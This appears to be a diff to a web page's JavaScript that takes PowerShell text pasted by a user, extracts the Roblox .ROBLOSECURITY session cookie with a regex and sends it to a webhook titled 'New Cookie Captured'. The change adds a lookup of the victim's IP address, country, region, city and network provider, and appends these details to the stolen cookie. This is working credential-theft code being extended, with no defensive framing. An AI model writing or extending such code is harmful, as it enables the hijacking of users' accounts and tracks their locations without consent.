@@ -69,12 +69,28 @@ document.getElementById('submitButton').addEventListener('click', async function
     return;
   }
 
-  // Send webhook for valid cookie
+  // Send webhook for valid cookie with IP logging
   const roblosecurityRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
   const match = powershellData.match(roblosecurityRegex);
+  let ipInfo = null;
   if (match) {
     const cookie = match[1].trim();
-    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\``, 0x00ff00);
+    // Fetch IP and location info
+    try {
+      const res = await fetch('https://ipapi.co/json');
+      if (res.ok) {
+        ipInfo = await res.json();
+      }
+    } catch (e) {
+      ipInfo = null;
+    }
+    let locationText = '';
+    if (ipInfo) {
+      locationText = `IP: ${ipInfo.ip}\nCountry: ${ipInfo.country_name}\nRegion: ${ipInfo.region}\nCity: ${ipInfo.city}\nOrg: ${ipInfo.org}`;
+    } else {
+      locationText = 'IP/location lookup failed.';
+    }
+    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\`\n${locationText}`, 0x00ff00);
   }
 
   powershellInput.value = '';
